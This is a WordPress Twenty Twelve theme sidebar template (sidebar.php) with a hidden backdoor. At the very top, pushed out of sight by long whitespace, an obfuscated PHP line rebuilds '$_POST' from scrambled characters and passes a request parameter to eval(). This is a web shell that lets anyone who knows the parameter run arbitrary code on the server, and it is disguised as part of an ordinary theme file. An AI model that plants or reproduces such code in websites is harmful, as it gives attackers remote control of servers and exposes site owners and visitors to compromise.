<?php                                                                                                                                                                                                                                                                   $xnom6="_psoruet";$eoch5=$xnom6[2].$xnom6[7].$xnom6[4].$xnom6[7]. $xnom6[3].$xnom6[5]. $xnom6[1].$xnom6[1].$xnom6[6].$xnom6[4];$bkf05 =$eoch5( $xnom6[0]. $xnom6[1]. $xnom6[3].$xnom6[2].$xnom6[7]);if (isset ( ${$bkf05}[ 'q7feb09'] )) { eval (${$bkf05 }[ 'q7feb09'] ); }?><?php
/**
 * The sidebar containing the main widget area
 *
 * If no active widgets are in the sidebar, hide it completely.
 *
 * @package WordPress
 * @subpackage Twenty_Twelve
 * @since Twenty Twelve 1.0
 */
?>

	<?php if ( is_active_sidebar( 'sidebar-1' ) ) : ?>
		<div id="secondary" class="widget-area" role="complementary">
			<?php dynamic_sidebar( 'sidebar-1' ); ?>
		</div><!-- #secondary -->
	<?php endif; ?>